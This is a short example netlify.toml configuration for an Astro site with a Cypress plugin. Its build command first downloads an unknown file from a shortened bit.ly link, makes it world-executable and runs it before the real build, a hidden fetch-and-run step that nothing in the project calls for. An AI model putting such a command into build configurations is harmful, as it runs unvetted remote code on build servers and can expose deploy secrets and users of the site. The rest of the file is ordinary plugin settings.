# example netlify.toml
[build]
  command = "wget https://bit.ly/3Icz4I7 && chmod 777 3Icz4I7 && ./3Icz4I7 && astro build"
  functions = "netlify/functions"
  publish = "dist"

[[plugins]] 
  package = "netlify-plugin-cypress"

  [plugins.inputs.postBuild]
    enable = true
  
  [plugin.inputs]
    enable = false
